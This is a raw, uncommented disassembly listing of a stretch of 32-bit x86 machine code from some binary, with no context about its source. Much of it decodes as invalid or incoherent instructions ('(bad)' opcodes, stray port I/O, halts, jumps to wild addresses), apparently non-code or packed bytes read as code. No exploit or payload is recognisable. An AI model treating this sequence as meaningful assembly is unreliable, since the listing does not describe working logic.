  403d4c:	or     bh,bh
  403d4e:	push   edx
  403d4f:	shl    DWORD PTR [edx],0x6f
  403d52:	add    cl,ch
  403d54:	ror    DWORD PTR ds:[ebx-0x3d424156],1
  403d5b:	in     eax,0xf3
  403d5d:	push   ecx
  403d5e:	mov    edi,DWORD PTR [ebp+0x248353c6]
  403d64:	cld    
  403d65:	push   es
  403d66:	jne    0x403d5a
  403d68:	fwait
  403d69:	add    eax,0x4bf3e900
  403d6e:	pop    ebx
  403d6f:	mov    al,ds:0x71fffb35
  403d74:	sar    dl,0xba
  403d77:	jmp    0x340446f
  403d7c:	in     al,dx
  403d7d:	stos   DWORD PTR es:[edi],eax
  403d7e:	jne    0x403d59
  403d80:	cmp    ch,BYTE PTR [ebp+esi*2-0x4789840f]
  403d87:	jmp    0xd800bf7f
  403d8c:	fild   WORD PTR [edi]
  403d8e:	clc    
  403d8f:	add    BYTE PTR [ecx],ch
  403d91:	pop    ss
  403d92:	add    esp,0x0
	...
  403da5:	add    bl,ah
  403da7:	push   es
  403da8:	jne    0x403d90
  403daa:	push   ds
  403dab:	push   es
  403dac:	add    cl,ch
  403dae:	repz lahf 
  403db0:	add    al,BYTE PTR [edx-0x53]
  403db3:	jg     0x403d78
  403db5:	(bad)  
  403db6:	es mov esi,0x51f3edc2
  403dbc:	mov    eax,DWORD PTR ds:0xff4c26c
  403dc2:	inc    edx
  403dc3:	stos   DWORD PTR es:[edi],eax
  403dc4:	inc    DWORD PTR [eax]
  403dc6:	hlt    
  403dc7:	stos   DWORD PTR es:[edi],eax
  403dc8:	mov    es,WORD PTR [ebp-0x899b]
  403dce:	push   ss
  403dcf:	jg     0x403dc9
  403dd1:	dec    BYTE PTR [esi+0x75]
  403dd4:	add    BYTE PTR [eax],al
  403dd6:	dec    ecx
  403dd7:	pop    es
  403dd8:	mov    DWORD PTR [ebp-0x87d3],0x758
  403de2:	pushf  
  403de3:	add    DWORD PTR [eax],0xffffffff
  403de6:	cs jne 0x403de8
  403de9:	jne    0x403e0c
  403deb:	xchg   BYTE PTR [eax],al
  403ded:	lea    edx,[esi+ebp*2+0x524efffe]
  403df4:	push   0x0
  403df6:	add    eax,DWORD PTR [ebx]
  403df8:	lea    eax,[ebp-0x8793]
  403dfe:	leave  
  403dff:	or     al,0x0
  403e01:	call   0x4058e3
  403e06:	mov    bl,BYTE PTR [edx-0x1]
  403e09:	je     0x403e0b
	...
  403e1b:	add    ch,dl
  403e1d:	stos   DWORD PTR es:[edi],eax
  403e1e:	mov    edi,0xbfb3d575
  403e23:	jmp    0x403df9
  403e25:	push   ds
  403e26:	add    DWORD PTR [eax],eax
  403e28:	leave  
  403e29:	push   es
  403e2a:	leave  
  403e2b:	ret    0x6c1
  403e2e:	push   ebp
  403e2f:	mov    ebp,DWORD PTR ds:0x7afcc484
  403e35:	retf   
  403e36:	fisubr DWORD PTR [edx-0x6d]
  403e39:	ja     0x403eb0
  403e3b:	or     BYTE PTR [ecx+0x2a],al
  403e3e:	(bad)  
  403e3f:	(bad)  
  403e40:	fisubr WORD PTR [ebx+0xc8574bf]
  403e46:	pop    edx
  403e47:	push   DWORD PTR [esi+ebp*4-0x19]
  403e4b:	jg     0x403e3b
  403e4d:	ja     0x403e4e
  403e4f:	or     esi,eax
  403e51:	fbstp  TBYTE PTR [esi]
  403e53:	add    cl,BYTE PTR [ebx+0xa001d64]
  403e59:	lahf   
  403e5a:	jle    0x403ea1
  403e5c:	outs   dx,DWORD PTR ds:[esi]
  403e5d:	nop
  403e5e:	mov    al,0x75
  403e60:	clc    
  403e61:	pop    es
  403e62:	pop    es
  403e63:	mov    eax,0xc0869ff0
  403e68:	(bad)  
  403e69:	(bad)  
  403e6b:	inc    ebp
  403e6c:	in     al,0xe7
  403e6e:	inc    esi
  403e6f:	(bad)  
  403e70:	mov    ebp,0x6b01749d
  403e75:	repz dec DWORD PTR [edx+0x6a0455e2]
  403e7c:	icebp  
  403e7d:	sbb    al,BYTE PTR [esi-0x1]
	...
  403e90:	add    BYTE PTR [eax],al
  403e92:	shl    BYTE PTR [eax+0x36],0xc
  403e96:	pop    ds
  403e97:	push   cs
  403e98:	adc    al,0xff
  403e9a:	popf   
  403e9b:	mov    bl,0x9b
  403e9d:	mov    eax,0x3bb0892c
  403ea2:	lods   eax,DWORD PTR ds:[esi]
  403ea3:	scas   eax,DWORD PTR es:[edi]
  403ea4:	xor    eax,0x86a40b02
  403ea9:	fstp   TBYTE PTR [ebx+edx*2+0x7c]
  403ead:	ret    
  403eae:	dec    ebx
  403eaf:	ja     0x403e76
  403eb1:	adc    al,0xf0
  403eb3:	or     bh,BYTE PTR [ebp-0x14]
  403eb6:	jno    0x403f1b
  403eb8:	add    edi,eax
  403eba:	xlat   BYTE PTR ds:[ebx]
  403ebb:	and    BYTE PTR [ebx+ebp*1-0x55],dl
  403ebf:	aad    0x4d
  403ec1:	(bad)  
  403ec2:	cmp    eax,0xbf189ba8
  403ec7:	cmp    BYTE PTR [eax+0x286bb00b],dh
  403ecd:	push   0x4a
  403ecf:	jmp    0xa5d84709
  403ed4:	mov    al,0xff
  403ed6:	lahf   
  403ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ed8:	ret    
  403ed9:	jne    0x403ecd
  403edb:	push   es
  403edc:	adc    bl,BYTE PTR [eax+0x71]
  403edf:	sub    edi,ecx
  403ee1:	add    edi,eax
  403ee3:	push   es
  403ee4:	jmp    0xe9af3622
  403ee9:	sti    
  403eea:	ja     0x403e95
  403eec:	adc    al,BYTE PTR [ebx+edi*2]
  403eef:	inc    ebx
  403ef0:	fstp   DWORD PTR ds:0x866456f0
	...
  403f06:	add    BYTE PTR [eax],al
  403f08:	lock scas al,BYTE PTR es:[edi]
  403f0a:	out    dx,al
  403f0b:	scas   eax,DWORD PTR es:[edi]
  403f0c:	shr    BYTE PTR [ecx+0x2d57fc5c],0x96
  403f13:	add    al,0xf0
  403f15:	sub    DWORD PTR [ecx-0x2620dd3],0x38
  403f1c:	repz inc ebp
  403f1e:	shl    bh,cl
  403f20:	mov    edi,0x7b00147d
  403f25:	adc    al,0x43
  403f27:	add    al,0xc0
  403f29:	jnp    0x403f8f
  403f2b:	add    al,0x18
  403f2d:	test   eax,0x330f54a6
  403f32:	in     eax,dx
  403f33:	scas   al,BYTE PTR es:[edi]
  403f34:	mov    ds:0xb4dd3116,al
  403f39:	push   ss
  403f3a:	push   0x31
  403f3c:	loopne 0x403f44
  403f3e:	cld    
  403f3f:	add    dh,BYTE PTR [ebx]
  403f41:	pushf  
  403f42:	in     eax,0x88
  403f44:	retf   
  403f45:	xor    edx,DWORD PTR [eax+0x7b]
  403f48:	mov    bl,0x4c
  403f4a:	mov    al,ds:0xbc06e4c2
  403f4f:	jp     0x403f2d
  403f51:	test   BYTE PTR ds:0x55f41fac,ah
  403f57:	sbb    dh,al
  403f59:	dec    edi
  403f5a:	dec    esi
  403f5b:	cmp    eax,ebp
  403f5d:	sahf   
  403f5e:	sbb    cl,bl
  403f60:	scas   eax,DWORD PTR es:[edi]
  403f61:	test   al,0x26
  403f63:	dec    ecx
  403f64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f65:	pop    es
  403f66:	add    cl,ch
  403f68:	repz push es
  403f6a:	mov    edx,DWORD PTR [eax+eax*1+0x0]
	...
  403f7d:	add    BYTE PTR [ebx+0x3974127d],bl
  403f83:	scas   eax,DWORD PTR es:[edi]
  403f84:	push   eax
  403f85:	xchg   ebx,eax
  403f86:	out    dx,eax
  403f87:	jns    0x403fce
  403f89:	adc    eax,0xe175a824
  403f8e:	inc    esi
  403f8f:	push   ebp
  403f90:	or     al,0xae
  403f92:	je     0x403fbe
  403f94:	cld    
  403f95:	in     al,dx
  403f96:	imul   edi,ebx,0x85597d09
  403f9c:	jge    0x403f8f
  403f9e:	repz xor ecx,ecx
  403fa1:	sbb    dh,BYTE PTR [esp+ebx*4]
  403fa4:	add    eax,0xc0842e72
  403fa9:	jmp    0x51f3:0xe5c2bdae
  403fb0:	mov    edx,ebp
  403fb2:	jb     0x403f77
  403fb4:	hlt    
  403fb5:	sbb    bh,BYTE PTR [edi-0xc0c67e2]
  403fbb:	push   es
  403fbc:	call   0xffe88f9f
  403fc1:	jo     0x403f7b
  403fc3:	stos   BYTE PTR es:[edi],al
  403fc4:	lea    esp,[eax+ecx*2]
  403fc7:	push   edi
  403fc8:	call   0xffe86aa2
  403fcd:	fisubr DWORD PTR [edx]
  403fcf:	sbb    eax,0x1fea131e
  403fd4:	add    BYTE PTR [ebx-0x300f90d],al
  403fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fdc:	jne    0x403fbf
  403fde:	jnp    0x403f62
  403fe0:	(bad)  
  403fe1:	data16 add BYTE PTR [eax],al
	...
  403ff4:	sahf   
  403ff5:	add    eax,0xf66fee
  403ffb:	jmp    0x55b5e7f3
  404000:	pop    ebx
  404001:	jp     0x403fde
  404003:	add    BYTE PTR [esi],dh
  404005:	pop    ecx
  404006:	cmp    eax,0x43300
  40400b:	jbe    0x403f99
  40400d:	mov    bl,BYTE PTR [ecx+eax*1]
  404010:	mov    DWORD PTR [ebx],eax
  404012:	push   DWORD PTR [ebp-0x13]
  404015:	mov    ebx,DWORD PTR [edx-0x1]
  404018:	out    0x58,al
  40401a:	test   eax,eax
  40401c:	pop    ebp
  40401d:	mov    edi,0x8bdd75ff
  404022:	(bad)  
  404023:	(bad)  
  404025:	pop    eax
  404026:	mov    edx,DWORD PTR [ebp+0x5d]
  404029:	sub    eax,0xb496a12
  40402e:	xor    al,0x21
  404030:	dec    ecx
  404031:	add    edi,edi
  404033:	jne    0x40408a
  404035:	pop    ecx
  404036:	jne    0x40402c
  404038:	es push esp
  40403a:	or     al,0xc7
  40403c:	or     al,0x5b
  40403e:	add    BYTE PTR [eax],al
  404040:	dec    ecx
  404041:	add    ebp,DWORD PTR [eax+0x14]
  404044:	add    eax,0xdcff0044
  404049:	jbe    0x404033
  40404b:	sbb    DWORD PTR [edi+0x12530002],ebx
  404051:	ret    
  404052:	je     0x40408a
  404054:	sbb    BYTE PTR [edx+0x68],0x14
	...
  404068:	add    BYTE PTR [eax],al
  40406a:	xor    eax,0xd9e80044
  40406f:	add    BYTE PTR cs:[eax],al
  404072:	or     bl,BYTE PTR [ebx+0x57]
  404075:	inc    edi
  404076:	(bad)  
  404077:	aam    0xb9
  404079:	xchg   esp,eax
  40407a:	enter  0xa,0xb0
  40407e:	aam    0x58
  404080:	scas   al,BYTE PTR es:[edi]
  404081:	mov    eax,0xfffffa3d
  404086:	loop   0x404051
  404088:	mov    BYTE PTR [edi+0x26],0xb
  40408c:	push   edi
  40408d:	push   ebx
  40408e:	lock inc edi
  404090:	mov    cl,0xb5
  404092:	lock scas eax,DWORD PTR es:[edi]
  404094:	jp     0x4040db
  404096:	test   al,0x6d
  404098:	lds    eax,FWORD PTR [edi-0x59]
  40409b:	mov    bl,0x4c
  40409d:	pop    ebx
  40409e:	or     BYTE PTR [eax+eiz*8],dl
  4040a1:	inc    eax
  4040a2:	lock hlt 
  4040a4:	ss cld 
  4040a6:	cwde   
  4040a7:	loopne 0x40411f
  4040a9:	add    al,dh
  4040ab:	pusha  
  4040ac:	clc    
  4040ad:	mov    edi,0xf8787404
  4040b2:	or     ah,cl
  4040b4:	fild   WORD PTR [eax-0x10]
  4040b7:	mul    esp
  4040b9:	mov    bl,0xf0
  4040bb:	scas   eax,DWORD PTR es:[edi]
  4040bc:	add    al,bh
  4040be:	(bad)  
  4040bf:	je     0x404139
  4040c1:	fistp  WORD PTR [ecx-0xfffecc4]
  4040c7:	jg     0x4040c7
  4040c9:	icebp  
  4040ca:	xchg   esi,eax
  4040cb:	push   0x1197
	...
  4040e0:	lock scas eax,DWORD PTR es:[edi]
  4040e2:	fadd   st,st(0)
  4040e4:	cs in  eax,dx
  4040e6:	lods   al,BYTE PTR ds:[esi]
  4040e7:	add    bh,al
  4040e9:	add    BYTE PTR [edi+eiz*2-0x74539ade],bl
  4040f0:	lds    edi,FWORD PTR [edi-0x54632e08]
  4040f6:	jp     0x4040fa
  4040f8:	sbb    esi,DWORD PTR [esi-0x6dfe17ad]
  4040fe:	lods   al,BYTE PTR ds:[esi]
  4040ff:	call   FWORD PTR [edi-0x1a00bb8b]
  404105:	hlt    
  404106:	dec    eax
  404107:	jmp    DWORD PTR [ebp+0x24]
  40410a:	fwait
  40410b:	and    eax,0x83ac24c5
  404110:	pop    ebp
  404111:	sbb    BYTE PTR [ebx],al
  404113:	ja     0x404104
  404115:	ins    BYTE PTR es:[edi],dx
  404116:	inc    esi
  404117:	clc    
  404118:	lock push es
  40411a:	jmp    0xd4e63182
  40411f:	stos   DWORD PTR es:[edi],eax
  404120:	mov    edi,0x3dac5d1b
  404125:	cmovno esp,DWORD PTR [ebp+ebp*4+0x1dac46a5]
  40412d:	fwait
  40412e:	push   ecx
  40412f:	xchg   BYTE PTR [edx+0x57f836a5],bh
  404135:	sbb    ebp,ebx
  404137:	cwde   
  404138:	jmp    0x40414b
  40413a:	sub    DWORD PTR [edi],esi
  40413c:	fist   WORD PTR [ecx-0x794484c]
  404142:	adc    eax,0x36
	...
  404153:	add    BYTE PTR [eax],al
  404155:	add    ah,ah
  404157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404158:	xchg   esp,eax
  404159:	mov    bh,0x6f
  40415b:	cmp    BYTE PTR [ebp-0x1be1cf7a],bh
  404161:	push   0x3e906f1
  404166:	imul   edi,DWORD PTR [ebx],0xfffffff5
  404169:	ja     0x40414d
  40416b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40416c:	pop    esp
  40416d:	mov    al,0x47
  40416f:	cmp    cl,dh
  404171:	stos   BYTE PTR es:[edi],al
  404172:	lds    esp,FWORD PTR [edx-0x5aad803f]
  404178:	into   
  404179:	jg     0x4041ae
  40417b:	inc    ebp
  40417c:	and    bh,BYTE PTR [ebp+0x50e91232]
  404182:	imul   esi,DWORD PTR [edx+0x3d60c06a],0x1a
  404189:	fild   QWORD PTR [edx]
  40418b:	cs jmp 0x91e54974
  404191:	adc    BYTE PTR [edx],0xa5
  404194:	xchg   esi,eax
  404195:	jge    0x404144
  404197:	mov    ds:0x7100401,al
  40419c:	jmp    0x7ee9ab3c
  4041a1:	stos   DWORD PTR es:[edi],eax
  4041a2:	imul   ecx,DWORD PTR [edx+0x0],0x2006f43d
  4041a9:	jmp    0x4bacf0a1
  4041ae:	fwait
  4041af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041b0:	mov    DWORD PTR [edi+edx*2+0x45297d92],esp
  4041b7:	jecxz  0x4041b8
  4041b9:	call   0x4041be
	...
  4041ca:	add    BYTE PTR [eax],al
  4041cc:	repz xlat BYTE PTR ds:[ebx]
  4041ce:	mov    edi,0x45cc463a
  4041d3:	sub    DWORD PTR [eax-0x4d16005c],ecx
  4041d9:	dec    edx
  4041da:	aam    0x2e
  4041dc:	sti    
  4041dd:	push   es
  4041de:	add    BYTE PTR [esi],ch
  4041e0:	xor    DWORD PTR [edi+0x6f3feff],edx
  4041e6:	call   FWORD PTR [edi+ecx*2-0x64c6ba6c]
  4041ed:	sbb    dh,BYTE PTR [esi+esi*2-0x5b724d4f]
  4041f4:	xor    esi,DWORD PTR [edi]
  4041f6:	push   0x8006f3e9
  4041fb:	xor    ebx,0xffffffa3
  4041fe:	jne    0x4041f1
  404200:	imul   ebp,DWORD PTR [ecx-0x4c],0xffffffe9
  404204:	repz xadd BYTE PTR [ebp-0xe],bl
  404209:	xchg   DWORD PTR [ebp-0x47],edi
  40420c:	repz sbb DWORD PTR ds:0x769d0,eax
  404213:	jmp    0xb6f08c4a
  404218:	jmp    0x5056:0xb05c0006
  40421f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404220:	shl    BYTE PTR [edx+0x68],0xe9
  404224:	repz push es
  404226:	and    BYTE PTR [eax+esi*4-0x3a],0x50
  40422b:	sbb    DWORD PTR [eax],0x5b
	...
  404241:	add    cl,bl
  404243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404244:	mov    edi,0xa982d475
  404249:	add    cl,cl
  40424b:	pop    es
  40424c:	mov    eax,DWORD PTR [ebp+0x5]
  40424f:	mov    BYTE PTR [eax],0x0
  404252:	cmp    al,0xef
  404254:	mov    edi,0xaddb9
  404259:	add    dl,bl
  40425b:	retf   0xaaf3
  40425e:	(bad)  
  40425f:	inc    esi
  404260:	sar    BYTE PTR [ecx+ebx*4],0x7
  404264:	add    bh,bh
  404266:	xor    ecx,DWORD PTR fs:[edi+0x45c92d45]
  40426d:	aam    0xde
  40426f:	adc    BYTE PTR [eax],al
  404271:	add    dh,dl
  404273:	inc    esi
  404274:	lock (bad) 
  404276:	jle    0x40427f
  404278:	add    BYTE PTR [ebp+0x6a50c744],cl
  40427e:	pop    ecx
  40427f:	add    DWORD PTR [eax],eax
  404281:	jmp    esp
  404283:	sub    ebp,eax
  404285:	xor    DWORD PTR ds:0x90b0008,esp
  40428b:	hlt    
  40428c:	add    eax,0xb7dc83
  404291:	jne    0x4042ee
  404293:	and    BYTE PTR [eax-0x1],0xa4
  404297:	outs   dx,BYTE PTR ds:[esi]
  404298:	push   DWORD PTR [ebp+0x55]
  40429b:	add    ch,BYTE PTR [esi]
  40429d:	sub    al,0xd8
  40429f:	or     bh,bh
  4042a1:	jne    0x404310
  4042a3:	or     dl,0xb3
	...
  4042b6:	add    BYTE PTR [eax],al
  4042b8:	or     DWORD PTR [edi],eax
  4042ba:	add    esp,0x39
  4042bd:	sahf   
  4042be:	mov    dh,0x45
  4042c0:	popa   
  4042c1:	cmp    ch,BYTE PTR [edx+0x0]
  4042c4:	dec    esi
  4042c5:	repz sti 
  4042c7:	call   0x3fb73b
  4042cc:	lock test al,0xc3
  4042cf:	jne    0x4042c3
  4042d1:	test   bh,ch
  4042d3:	mov    BYTE PTR ds:0x9c75a948,ch
  4042d9:	js     0x404300
  4042db:	mov    dl,0xf0
  4042dd:	scas   eax,DWORD PTR es:[edi]
  4042de:	push   ebx
  4042df:	inc    DWORD PTR [ebp-0xc]
  4042e2:	test   al,0x75
  4042e4:	mov    BYTE PTR [eax],bh
  4042e6:	dec    edi
  4042e7:	sti    
  4042e8:	mov    edi,0x3dbffd41
  4042ed:	scas   al,BYTE PTR es:[edi]
  4042ee:	pushf  
  4042ef:	adc    BYTE PTR [edi+0x1dff13bb],ch
  4042f5:	pushf  
  4042f6:	test   al,0x75
  4042f8:	pop    eax
  4042f9:	cmp    bh,ch
  4042fb:	cld    
  4042fc:	xchg   edi,eax
  4042fd:	fnstcw WORD PTR [eax+ebx*8-0x71]
  404301:	pop    ebx
  404302:	imul   ebp,eax,0xfffffff5
  404305:	inc    ebx
  404306:	add    al,0x0
  404308:	jg     0x404385
  40430a:	outs   dx,DWORD PTR ds:[esi]
  40430b:	call   0xffe951d5
  404310:	outs   dx,DWORD PTR ds:[esi]
  404311:	jnp    0x40437a
  404313:	call   0xffe95225
  404318:	pop    edi
  404319:	sbb    esp,DWORD PTR [edi+0xe8]
	...
  40432b:	add    BYTE PTR [eax],al
  40432d:	add    ch,dh
  40432f:	push   cs
  404330:	test   eax,0x4ced7bff
  404335:	pop    edi
  404336:	cmp    DWORD PTR [esi-0x9],ebp
  404339:	jmp    DWORD PTR [esp+edx*1-0x43d37c69]
  404340:	jl     0x404387
  404342:	cld    
  404343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404344:	ret    
  404345:	je     0x404335
  404347:	jo     0x40434c
  404349:	add    al,dh
  40434b:	scas   eax,DWORD PTR es:[edi]
  40434c:	add    eax,edi
  40434e:	lods   eax,DWORD PTR ds:[esi]
  40434f:	pop    ebx
  404350:	add    eax,DWORD PTR [eax]
  404352:	lock scas eax,DWORD PTR es:[edi]
  404354:	jbe    0x40439b
  404356:	add    al,0x7
  404358:	cmp    DWORD PTR [ecx+0x2e9e1285],ebp
  40435e:	call   0xefea4411
  404363:	mov    eax,ds:0x6e4266a
  404368:	std    
  404369:	adc    BYTE PTR [edx+0x7],cl
  40436c:	jle    0x40439c
  40436e:	in     al,0xa1
  404370:	cld    
  404371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404372:	fdivr  DWORD PTR [eax]
  404374:	outs   dx,DWORD PTR ds:[esi]
  404375:	test   al,0xc7
  404377:	ss cs mov sp,0x39ae
  40437d:	mov    ds:0xbab1a1b7,eax
  404382:	mov    dl,0xe
  404384:	jmp    0x6af2bed7
  404389:	mov    edi,0x3e26289c
  40438e:	xchg   esp,eax
  40438f:	pop    es
  404390:	jmp    0x4043b6
	...
  4043a1:	add    BYTE PTR [eax],al
  4043a3:	add    BYTE PTR [edi-0xff6d0b5],dh
  4043a9:	sub    al,0xed
  4043ab:	jbe    0x4043e2
  4043ad:	mov    ds:0x6701bb9,eax
  4043b2:	jmp    0xee21bba
  4043b7:	add    esi,eax
  4043b9:	mov    eax,ds:0x7757fb7c
  4043be:	cmp    al,BYTE PTR [ebx]
  4043c0:	lock iret 
  4043c2:	sub    edi,edi
  4043c4:	dec    edi
  4043c5:	cmp    ah,BYTE PTR [edx-0x69]
  4043c8:	jae    0x404394
  4043ca:	xchg   ebp,eax
  4043cb:	dec    edi
  4043cc:	mov    ds:0xf05824c9,eax
  4043d1:	push   es
  4043d2:	jmp    0x41fe26da
  4043d7:	add    al,0x0
  4043d9:	pop    es
  4043da:	jmp    0xbee6bd7a
  4043df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043e0:	imul   ecx,DWORD PTR [ebx+0x0],0x1006eca9
  4043e7:	jmp    0x89ccf2df
  4043ec:	push   edi
  4043ed:	mov    eax,ds:0x2e842489
  4043f2:	add    cl,bh
  4043f4:	repz push es
  4043f6:	call   0xffe0d009
  4043fb:	jo     0x40442e
  4043fd:	arpl   WORD PTR [ebp+0x3c5e97fc],cx
  404403:	jmp    0xa9734afb
	...
  404418:	add    BYTE PTR [eax],al
  40441a:	sub    DWORD PTR [ebp-0x39],0xffffffac
  40441e:	jg     0x404403
  404420:	(bad)  
  404421:	call   0x29b5e419
  404426:	daa    
  404427:	dec    edx
  404428:	aam    0x4e
  40442a:	loope  0x40448a
  40442c:	(bad)  
  40442d:	lods   al,BYTE PTR ds:[esi]
  40442e:	arpl   ax,cx
  404430:	inc    ebp
  404431:	and    DWORD PTR [edi+0x10],ecx
  404434:	add    cl,ch
  404436:	dec    esi
  404437:	dec    edx
  404438:	hlt    
  404439:	cs jg  0x4043dc
  40443c:	push   DWORD PTR [ecx+esi*1-0x35]
  404440:	push   eax
  404441:	xchg   ecx,eax
  404442:	repz push es
  404444:	add    BYTE PTR [ecx+0xa],ch
  404447:	pop    es
  404448:	call   DWORD PTR [ebx+ebp*2-0xbc44a58]
  40444f:	push   es
  404450:	or     ebp,DWORD PTR [ecx]
  404452:	and    BYTE PTR [ecx],cl
  404454:	xor    DWORD PTR [edi+edi*1+0x7],0x75
  404459:	in     al,0x64
  40445b:	mov    ds:0xc7f3e900,al
  404460:	inc    ebp
  404461:	cdq    
  404462:	mov    ss,WORD PTR [eax]
  404464:	add    cl,ch
  404466:	test   al,0x49
  404468:	mov    al,0x39
  40446a:	dec    edi
  40446b:	sbb    bh,BYTE PTR [eax+eax*1+0xac1]
  404472:	mov    DWORD PTR [esi],ebx
  404474:	inc    ebp
  404475:	(bad)  
  404476:	jmp    0x19f2d4fd
  40447b:	add    al,0xb
  40447d:	rol    BYTE PTR [eax],0x0
	...
  404490:	fadd   QWORD PTR ds:0x409d8e9
  404496:	add    BYTE PTR [ebx+0xc6331c],cl
  40449c:	fstp   DWORD PTR [esi]
  40449e:	jge    0x404464
  4044a0:	xor    BYTE PTR [eax-0x6b360001],ch
  4044a6:	mov    edi,0x456133f3
  4044ab:	les    edx,FWORD PTR [ebp+0x56000003]
  4044b1:	xlat   BYTE PTR ds:[ebx]
  4044b2:	mov    bh,0x8f
  4044b4:	mov    WORD PTR [ebx-0x39],ss
  4044b7:	inc    ebp
  4044b8:	loope  0x404522
  4044ba:	ltr    WORD PTR [ecx+0x36f44560]
  4044c1:	cdq    
  4044c2:	(bad)  
  4044c3:	inc    DWORD PTR [edi+eax*2]
  4044c6:	les    edx,FWORD PTR [eax-0x4d]
  4044c9:	add    ebp,DWORD PTR [edx+0x0]
  4044cc:	(bad)  
  4044cd:	(bad)  
  4044ce:	mov    ebx,0x154de8
  4044d3:	add    BYTE PTR [edx-0x25f98b3d],al
  4044d9:	out    dx,al
  4044da:	rol    DWORD PTR [eax],cl
  4044dc:	jl     0x4044e4
  4044de:	jmp    0x438e6f
  4044e3:	(bad)  
  4044e4:	fdivr  st(3),st
  4044e6:	(bad)  
  4044e7:	jne    0x404502
  4044e9:	imul   esi,DWORD PTR [ebp-0x48],0x412aa371
  4044f0:	dec    ecx
  4044f1:	push   0x75
  4044f3:	mov    esp,0x0
	...
  404504:	add    BYTE PTR [eax],al
  404506:	and    ecx,edx
  404508:	mov    cl,0x0
  40450a:	lock lods eax,DWORD PTR ds:[esi]
  40450c:	add    ah,0xfc
  40450f:	shr    BYTE PTR [ebp+eax*2+0x3c],0xfd
  404514:	sbb    DWORD PTR [eax],eax
  404516:	pop    ss
  404517:	fcmovb st,st(3)
  404519:	call   0xffe59a29
  40451e:	sti    
  40451f:	ins    DWORD PTR es:[edi],dx
  404520:	das    
  404521:	add    cl,BYTE PTR [ebx]
  404523:	inc    edi
  404524:	jnp    0x40456b
  404526:	cmp    al,0x80
  404528:	das    
  404529:	mov    ah,0xd8
  40452b:	dec    edi
  40452c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40452d:	jmp    edi
  40452f:	lea    ebp,[edi]
  404531:	mov    esp,0x73f8c8
  404536:	lock jmp DWORD PTR [ebp+esi*2-0x4bd0ea74]
  40453e:	fdivr  st,st(2)
  404540:	stos   BYTE PTR es:[edi],al
  404541:	(bad)  
  404542:	mov    edi,0xf275c399
  404547:	cmp    bl,dh
  404549:	sub    BYTE PTR ds:0xfc7403a0,0x4c
  404550:	das    
  404551:	adc    BYTE PTR [edi+0x1dfef75b],bl
  404557:	adc    al,0x9c
  404559:	inc    eax
  40455a:	mov    ebp,edx
  40455c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40455d:	or     esi,DWORD PTR [eax-0x1814fead]
  404563:	sbb    ah,cl
  404565:	or     ebx,DWORD PTR [ebx+0x8d1274]
	...
  40457b:	add    BYTE PTR [ebp-0x2200abbd],dh
  404581:	xchg   ebx,eax
  404582:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404583:	jne    0x404529
  404585:	clc    
  404586:	or     bh,bl
  404588:	push   edi
  404589:	popf   
  40458a:	js     0x404564
  40458c:	dec    edi
  40458d:	sbb    ebp,DWORD PTR [edi-0x18]
  404590:	inc    ecx
  404591:	fild   WORD PTR [ebx]
  404593:	add    BYTE PTR [edi],bh
  404595:	pop    es
  404596:	pop    esp
  404597:	les    ecx,FWORD PTR [eax-0x8]
  40459a:	mov    ebp,0x5c9e2fa4
  40459f:	push   0xa4ae1018
  4045a4:	pop    ds
  4045a5:	sahf   
  4045a6:	cmp    al,0x6c
  4045a8:	or     BYTE PTR [eax],cl
  4045aa:	sahf   
  4045ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045ac:	jp     0x13309de6
  4045b2:	loope  0x404558
  4045b4:	test   DWORD PTR [edx-0x6f],ebp
  4045b7:	mov    al,0x16
  4045b9:	sahf   
  4045ba:	sahf   
  4045bb:	js     0x404570
  4045bd:	inc    ecx
  4045be:	ss mov ebx,0x4ee8f6b2
  4045c4:	imul   ebp,DWORD PTR [edx+0x39d8bf6a],0xffffffd2
  4045cb:	enter  0x1b73,0xe5
  4045cf:	add    edi,DWORD PTR [ecx*2+0x6e0266a]
  4045d6:	fnstsw WORD PTR [ebx]
  4045d8:	gs inc ebx
  4045da:	pop    ebp
  4045db:	push   ebx
  4045dc:	scas   eax,DWORD PTR es:[edi]
  4045dd:	adc    esp,ebp
  4045df:	fwait
	...
  4045f0:	add    BYTE PTR [eax],al
  4045f2:	pushf  
  4045f3:	push   esi
  4045f4:	jmp    0xc206bafc
  4045f9:	repz xchg esi,eax
  4045fb:	adc    ebp,ebp
  4045fd:	fwait
  4045fe:	je     0x4045b4
  404600:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  404602:	jns    0x404647
  404604:	xor    DWORD PTR [ebp+eax*1+0x4766119b],esp
  40460b:	push   es
  40460c:	jmp    0xf052f609
  404611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404612:	(bad)  
  404614:	or     eax,0x636582e
  404619:	cs call 0x4fe630cd
  40461f:	popf   
  404620:	add    BYTE PTR [edx+0x3b],ah
  404623:	popf   
  404624:	jne    0x404613
  404626:	pop    edx
  404627:	fs scas eax,DWORD PTR es:[edi]
  404629:	jmp    0xedb5e421
  40462e:	pop    ebx
  40462f:	ds fcom st(6)
  404632:	push   ebx
  404633:	xchg   ecx,eax
  404634:	ret    
  404635:	xor    ch,BYTE PTR ds:0xd8e90cc8
  40463b:	xchg   ecx,eax
  40463c:	in     al,dx
  40463d:	push   0xb6fe1638
  404642:	push   ebx
  404643:	mov    eax,DWORD PTR [ebp-0x62adc5]
  404649:	cmp    esp,eax
  40464b:	pop    es
  40464c:	add    ecx,ebp
  40464e:	repz scas al,BYTE PTR es:[edi]
  404650:	arpl   WORD PTR [eax-0x14],bx
  404653:	push   es
  404654:	leave  
  404655:	stos   BYTE PTR es:[edi],al
	...
